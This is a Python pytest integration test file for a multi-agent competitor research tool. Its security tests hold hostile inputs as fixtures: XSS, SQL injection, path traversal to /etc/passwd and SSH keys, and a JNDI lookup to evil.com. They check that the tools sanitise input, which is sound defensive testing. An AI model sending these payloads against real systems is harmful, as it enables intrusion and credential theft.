"""
Advanced Integration Tests

Comprehensive integration tests for the Competitor Research Agent system,
covering end-to-end workflows, performance, security, and reliability.
"""

import pytest
import tempfile
import json
import time
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta

from src.workflows.competitor_research import create_workflow
from src.utils.config import config, validate_configuration
from src.utils.monitoring import error_monitor, health_checker
from src.utils.performance import performance_monitor, intelligent_cache
from src.tools.search_tool import SearchTool
from src.tools.scrape_tool import ScrapeTool
from src.tools.pdf_tool import EnhancedPDFReportTool


class TestEndToEndWorkflow:
    """End-to-end workflow testing"""
    
    @pytest.fixture
    def temp_output_dir(self):
        """Create temporary directory for test outputs"""
        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)
    
    @pytest.mark.integration
    @patch('src.tools.search_tool.DDGS')
    @patch('src.agents.researcher.Agent')
    @patch('src.agents.analyzer.Agent')
    @patch('src.agents.reporter.Agent')
    def test_complete_workflow_success(self, mock_reporter, mock_analyzer, mock_researcher, mock_ddgs):
        """Test complete successful workflow execution"""
        # Mock search results
        mock_ddgs_instance = Mock()
        mock_ddgs.return_value.__enter__.return_value = mock_ddgs_instance
        mock_ddgs_instance.text.return_value = [
            {
                'title': 'Company A - Leading competitor',
                'href': 'https://example.com/companyA',
                'body': 'Company A is a leading competitor in the market with innovative products.'
            },
            {
                'title': 'Company B - Market challenger',
                'href': 'https://example.com/companyB', 
                'body': 'Company B challenges the market with disruptive technology solutions.'
            }
        ]
        
        # Mock agent responses
        mock_crew_result = Mock()
        mock_crew_result.raw = "test_report.pdf"
        
        with patch('src.workflows.competitor_research.Crew') as mock_crew_class:
            mock_crew = Mock()
            mock_crew.kickoff.return_value = mock_crew_result
            mock_crew_class.return_value = mock_crew
            
            # Execute workflow
            result = create_workflow("test competitors analysis")
            
            # Verify result structure
            assert isinstance(result, dict)
            assert result.get("success") is True
            assert "result" in result
            assert "query" in result
            assert "attempts" in result
    
    @pytest.mark.integration
    def test_workflow_error_handling(self):
        """Test workflow error handling and recovery"""
        with patch('src.workflows.competitor_research.Crew') as mock_crew_class:
            # Simulate API error
            mock_crew = Mock()
            mock_crew.kickoff.side_effect = Exception("API rate limit exceeded")
            mock_crew_class.return_value = mock_crew
            
            result = create_workflow("test query")
            
            # Should handle error gracefully
            assert isinstance(result, dict)
            assert result.get("success") is False
            assert "error_type" in result
            assert "message" in result
    
    @pytest.mark.integration
    def test_workflow_with_different_query_types(self):
        """Test workflow with various query types"""
        test_queries = [
            "competitors to Tesla",
            "top fintech companies 2024",
            "AI image generation tools",
            "project management software comparison",
            "European SaaS companies"
        ]
        
        for query in test_queries:
            with patch('src.workflows.competitor_research.Crew') as mock_crew_class:
                mock_crew = Mock()
                mock_result = Mock()
                mock_result.raw = f"report_{hash(query)}.pdf"
                mock_crew.kickoff.return_value = mock_result
                mock_crew_class.return_value = mock_crew
                
                result = create_workflow(query)
                
                # Each query should be processed
                assert isinstance(result, dict)
                assert result.get("query") == query


class TestPerformanceIntegration:
    """Performance and scalability testing"""
    
    @pytest.fixture(autouse=True)
    def setup_performance_monitoring(self):
        """Setup performance monitoring for tests"""
        performance_monitor.metrics.clear()
        yield
        performance_monitor.metrics.clear()
    
    def test_performance_tracking_integration(self):
        """Test performance tracking during operations"""
        from src.utils.performance import performance_tracker
        
        @performance_tracker(cache_key="test_{args[0]}")
        def test_function(param):
            time.sleep(0.1)  # Simulate work
            return f"result for {param}"
        
        # Execute function
        result = test_function("test_param")
        
        # Verify performance was tracked
        assert result == "result for test_param"
        assert len(performance_monitor.metrics) > 0
        
        metric = performance_monitor.metrics[-1]
        assert metric.function_name == "test_function"
        assert metric.execution_time >= 0.1
        assert metric.success is True
    
    def test_cache_integration(self):
        """Test intelligent caching integration"""
        cache_key = "test_cache_integration"
        test_data = {"test": "data", "timestamp": datetime.now().isoformat()}
        
        # Store data
        success = intelligent_cache.set(cache_key, test_data, ttl=300)
        assert success is True
        
        # Retrieve data
        retrieved_data = intelligent_cache.get(cache_key)
        assert retrieved_data == test_data
        
        # Verify cache stats
        stats = intelligent_cache.get_stats()
        assert stats['cache_hits'] > 0
    
    @pytest.mark.performance
    def test_concurrent_operations(self):
        """Test system behavior under concurrent load"""
        import threading
        from concurrent.futures import ThreadPoolExecutor
        
        results = []
        errors = []
        
        def concurrent_operation(operation_id):
            try:
                # Simulate concurrent cache operations
                cache_key = f"concurrent_test_{operation_id}"
                test_data = {"operation_id": operation_id, "data": f"test_data_{operation_id}"}
                
                intelligent_cache.set(cache_key, test_data)
                retrieved = intelligent_cache.get(cache_key)
                
                results.append(retrieved)
                
            except Exception as e:
                errors.append(e)
        
        # Execute concurrent operations
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(concurrent_operation, i) for i in range(20)]
            for future in futures:
                future.result(timeout=10)
        
        # Verify results
        assert len(errors) == 0, f"Concurrent operations had errors: {errors}"
        assert len(results) == 20
        
        # Verify cache integrity
        cache_stats = intelligent_cache.get_stats()
        assert cache_stats['total_entries'] >= 20
    
    @pytest.mark.performance
    def test_memory_usage_monitoring(self):
        """Test memory usage monitoring during operations"""
        from src.utils.performance import resource_manager
        
        initial_memory = None
        peak_memory = None
        
        with resource_manager.resource_monitor("memory_test") as monitor:
            # Simulate memory-intensive operation
            large_data = []
            for i in range(1000):
                large_data.append(f"data_item_{i}" * 100)
            
            # Memory should be tracked
            pass
        
        # The context manager should log memory usage
        # Verify through logs that memory monitoring occurred


class TestSecurityIntegration:
    """Security and data protection testing"""
    
    def test_api_key_security(self):
        """Test API key security and validation"""
        # Test configuration validation
        is_valid = validate_configuration()
        
        # Should either be valid with keys or invalid without
        assert isinstance(is_valid, bool)
        
        # Test that API keys are not exposed in logs or outputs
        model_config = None
        try:
            model_config = config.get_model_config()
        except ValueError:
            # Expected if no API keys configured
            pass
        
        if model_config:
            # API key should not be fully visible
            assert "api_key" in model_config
            # In a real test, we'd verify the key is masked or encrypted
    
    def test_input_sanitization(self):
        """Test input sanitization and validation"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../etc/passwd",
            "javascript:alert(1)",
            "${jndi:ldap://evil.com/x}",
        ]
        
        search_tool = SearchTool()
        
        for malicious_input in malicious_inputs:
            # Should handle malicious input gracefully
            result = search_tool._run(malicious_input)
            
            # Result should be a string (error message or sanitized results)
            assert isinstance(result, str)
            
            # Should not contain raw malicious input
            assert malicious_input not in result or "Error" in result
    
    def test_file_path_security(self):
        """Test file path security and validation"""
        pdf_tool = EnhancedPDFReportTool()
        
        malicious_paths = [
            "../../../etc/passwd",
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\sam",
            "file:///etc/hosts",
        ]
        
        for malicious_path in malicious_paths:
            with tempfile.TemporaryDirectory() as temp_dir:
                try:
                    result = pdf_tool._run(
                        summary="test content",
                        filename=malicious_path,
                        query="test"
                    )
                    
                    # Should either fail safely or create file in safe location
                    if not result.startswith("Error"):
                        created_path = Path(result)
                        # File should be created in current directory or temp location, not system paths
                        assert not created_path.is_absolute() or temp_dir in str(created_path)
                        
                except Exception:
                    # Exception is acceptable for malicious paths
                    pass


class TestReliabilityIntegration:
    """System reliability and fault tolerance testing"""
    
    def test_error_recovery(self):
        """Test error recovery and system resilience"""
        # Test network failure simulation
        with patch('src.tools.search_tool.DDGS') as mock_ddgs:
            # Simulate network error
            mock_ddgs.side_effect = ConnectionError("Network unavailable")
            
            search_tool = SearchTool()
            result = search_tool._run("test query")
            
            # Should handle network error gracefully
            assert isinstance(result, str)
            assert any(word in result.lower() for word in ["error", "failed", "network"])
    
    def test_partial_failure_handling(self):
        """Test handling of partial system failures"""
        with patch('src.tools.search_tool.DDGS') as mock_ddgs:
            # Simulate partial search results
            mock_ddgs_instance = Mock()
            mock_ddgs.return_value.__enter__.return_value = mock_ddgs_instance
            mock_ddgs_instance.text.return_value = [
                {'title': 'Valid Result', 'href': 'https://example.com', 'body': 'Valid content'},
                None,  # Invalid result
                {'title': '', 'href': '', 'body': ''},  # Empty result
                {'title': 'Another Valid', 'href': 'https://example2.com', 'body': 'More content'}
            ]
            
            search_tool = SearchTool()
            result = search_tool._run("test query")
            
            # Should process valid results and handle invalid ones
            assert isinstance(result, str)
            assert "Valid Result" in result
            assert "Another Valid" in result
    
    def test_system_health_monitoring(self):
        """Test system health monitoring integration"""
        # Run health checks
        health_results = health_checker.run_health_checks()
        
        assert isinstance(health_results, dict)
        assert "overall_status" in health_results
        assert "checks" in health_results
        assert health_results["overall_status"] in ["healthy", "unhealthy"]
        
        # Verify individual health checks
        for check_name, check_result in health_results["checks"].items():
            assert isinstance(check_result, dict)
            assert "healthy" in check_result
            assert isinstance(check_result["healthy"], bool)
    
    def test_error_monitoring_integration(self):
        """Test error monitoring and reporting"""
        # Generate test error
        try:
            raise ValueError("Test error for monitoring")
        except Exception as e:
            error_id = error_monitor.record_error(e, {"test_context": "integration_test"})
            assert isinstance(error_id, str)
            assert len(error_id) > 0
        
        # Get error summary
        error_summary = error_monitor.get_error_summary(hours=1)
        
        assert isinstance(error_summary, dict)
        assert error_summary["total_errors"] >= 1
        assert "by_severity" in error_summary
        assert "by_category" in error_summary


class TestDataIntegration:
    """Data processing and quality testing"""
    
    def test_pdf_generation_quality(self):
        """Test PDF generation quality and content"""
        pdf_tool = EnhancedPDFReportTool()
        
        test_content = """
        Executive Summary:
        This analysis covers the competitive landscape for AI companies.
        
        Key Findings:
        - Microsoft and Google are leading competitors
        - OpenAI shows strong innovation in language models
        - The market is rapidly evolving with new entrants
        
        Competitors:
        1. Microsoft - Azure OpenAI Service
        2. Google - Bard and Gemini
        3. Anthropic - Claude AI assistant
        
        Recommendations:
        - Focus on differentiation through specialized models
        - Develop strategic partnerships
        - Invest in research and development
        """
        
        with tempfile.TemporaryDirectory() as temp_dir:
            output_path = Path(temp_dir) / "test_report.pdf"
            
            result = pdf_tool._run(
                summary=test_content,
                filename=str(output_path),
                query="AI competitors analysis"
            )
            
            # Verify PDF was created
            assert output_path.exists()
            assert output_path.stat().st_size > 1000  # Should be substantial
            
            # Verify structured data extraction
            structured_data = pdf_tool._extract_structured_data(test_content)
            
            assert isinstance(structured_data, dict)
            assert len(structured_data['competitors']) >= 3
            assert any('Microsoft' in comp for comp in structured_data['competitors'])
            assert any('Google' in comp for comp in structured_data['competitors'])
    
    def test_data_processing_accuracy(self):
        """Test accuracy of data processing and extraction"""
        search_tool = SearchTool()
        
        # Test query optimization
        optimized_queries = search_tool._optimize_query("competitors to Tesla")
        
        assert isinstance(optimized_queries, list)
        assert len(optimized_queries) >= 1
        assert any('Tesla' in query for query in optimized_queries)
        assert any('competitor' in query.lower() for query in optimized_queries)
    
    def test_structured_data_extraction(self):
        """Test structured data extraction from various content formats"""
        pdf_tool = EnhancedPDFReportTool()
        
        test_contents = [
            # Markdown-style content
            """
            ## Executive Summary
            The market analysis reveals strong competition.
            
            ### Key Competitors
            - **Tesla**: Electric vehicle leader
            - **BYD**: Chinese EV manufacturer
            - **Volkswagen**: Traditional automaker transitioning to EV
            
            ### Recommendations
            1. Focus on battery technology
            2. Expand charging infrastructure
            """,
            
            # Plain text content
            """
            Executive Summary: Market research shows competitive landscape.
            
            Companies analyzed:
            Tesla - Market leader in electric vehicles
            General Motors - Traditional automaker with EV plans
            Ford - Investing heavily in electric transition
            
            Strategic recommendations:
            Develop faster charging technology
            Build strategic partnerships
            """,
            
            # Mixed format content
            """
            COMPETITIVE ANALYSIS REPORT
            
            Key Findings:
            • Strong market growth expected
            • New entrants challenging incumbents
            • Technology differentiation crucial
            
            Major Players:
            1. Tesla Inc. - Innovation leader
            2. BYD Company - Cost advantage
            3. Mercedes-Benz - Premium segment
            """
        ]
        
        for i, content in enumerate(test_contents):
            structured_data = pdf_tool._extract_structured_data(content)
            
            # Each should extract some structured information
            assert isinstance(structured_data, dict)
            assert 'executive_summary' in structured_data
            assert 'competitors' in structured_data
            assert 'recommendations' in structured_data
            
            # Should extract at least some competitors
            assert len(structured_data['competitors']) > 0


class TestAPIIntegration:
    """API and external service integration testing"""
    
    @pytest.mark.integration
    @pytest.mark.skipif(not validate_configuration(), reason="API keys not configured")
    def test_real_api_integration(self):
        """Test integration with real API services (when configured)"""
        # This test only runs when API keys are properly configured
        search_tool = SearchTool()
        
        # Test with simple, reliable query
        result = search_tool._run("technology companies")
        
        assert isinstance(result, str)
        assert len(result) > 100  # Should have substantial content
        assert any(word in result.lower() for word in ["technology", "company", "tech"])
    
    def test_api_error_handling(self):
        """Test API error handling and fallbacks"""
        with patch('src.utils.config.config.get_model_config') as mock_config:
            # Simulate API configuration error
            mock_config.side_effect = ValueError("No valid API keys")
            
            from src.workflows.competitor_research import create_workflow
            result = create_workflow("test query")
            
            # Should handle configuration error gracefully
            assert isinstance(result, dict)
            assert result.get("success") is False


class TestUserExperienceIntegration:
    """User experience and workflow testing"""
    
    def test_complete_user_workflow(self):
        """Test complete user workflow from query to report"""
        # This simulates a complete user journey
        test_query = "competitors to Slack"
        
        with patch('src.workflows.competitor_research.Crew') as mock_crew_class:
            # Mock successful analysis
            mock_crew = Mock()
            mock_result = Mock()
            mock_result.raw = "slack_competitors_analysis.pdf"
            mock_crew.kickoff.return_value = mock_result
            mock_crew_class.return_value = mock_crew
            
            # Execute workflow
            start_time = time.time()
            result = create_workflow(test_query)
            execution_time = time.time() - start_time
            
            # Verify user experience expectations
            assert execution_time < 60  # Should complete in reasonable time
            assert isinstance(result, dict)
            assert result.get("success") is True
            assert result.get("query") == test_query
            
            # Should provide meaningful output
            assert "result" in result
            assert result.get("attempts", 0) >= 1
    
    def test_error_user_experience(self):
        """Test user experience during error scenarios"""
        with patch('src.workflows.competitor_research.Crew') as mock_crew_class:
            # Simulate different types of errors users might encounter
            error_scenarios = [
                (ConnectionError("Network timeout"), "network"),
                (ValueError("Invalid API key"), "authentication"), 
                (Exception("Rate limit exceeded"), "rate_limit")
            ]
            
            for error, expected_category in error_scenarios:
                mock_crew = Mock()
                mock_crew.kickoff.side_effect = error
                mock_crew_class.return_value = mock_crew
                
                result = create_workflow("test query")
                
                # Should provide user-friendly error information
                assert isinstance(result, dict)
                assert result.get("success") is False
                assert "message" in result
                assert len(result["message"]) > 0
                
                # Error message should be user-friendly, not technical
                message = result["message"].lower()
                assert not any(tech_term in message for tech_term in ["traceback", "exception", "stack"])


@pytest.mark.integration
class TestFullSystemIntegration:
    """Full system integration testing"""
    
    def test_system_startup_and_initialization(self):
        """Test system startup and initialization process"""
        # Test configuration loading
        config_valid = validate_configuration()
        assert isinstance(config_valid, bool)
        
        # Test monitoring system initialization
        assert error_monitor is not None
        assert performance_monitor is not None
        assert intelligent_cache is not None
        assert health_checker is not None
        
        # Test health checks can run
        health_results = health_checker.run_health_checks()
        assert isinstance(health_results, dict)
    
    def test_system_cleanup_and_shutdown(self):
        """Test system cleanup and shutdown procedures"""
        # Test cache cleanup
        initial_stats = intelligent_cache.get_stats()
        intelligent_cache.clear()
        final_stats = intelligent_cache.get_stats()
        
        # Cache should be cleared
        assert final_stats['total_entries'] == 0
        
        # Test performance metrics cleanup
        initial_metrics = len(performance_monitor.metrics)
        performance_monitor.metrics.clear()
        assert len(performance_monitor.metrics) == 0
    
    @pytest.mark.slow
    def test_long_running_stability(self):
        """Test system stability over extended operation"""
        # Simulate extended usage
        operations = []
        
        for i in range(50):  # Simulate 50 operations
            try:
                # Various cache operations
                cache_key = f"stability_test_{i}"
                test_data = {"iteration": i, "data": f"test_{i}"}
                
                intelligent_cache.set(cache_key, test_data)
                retrieved = intelligent_cache.get(cache_key)
                
                operations.append({
                    "iteration": i,
                    "success": retrieved is not None,
                    "data_matches": retrieved == test_data if retrieved else False
                })
                
                # Add some processing delay
                time.sleep(0.01)
                
            except Exception as e:
                operations.append({
                    "iteration": i,
                    "success": False,
                    "error": str(e)
                })
        
        # Verify system remained stable
        successful_operations = [op for op in operations if op.get("success")]
        success_rate = len(successful_operations) / len(operations)
        
        assert success_rate >= 0.95  # At least 95% success rate
        
        # Verify cache integrity
        cache_stats = intelligent_cache.get_stats()
        assert cache_stats['total_entries'] > 0
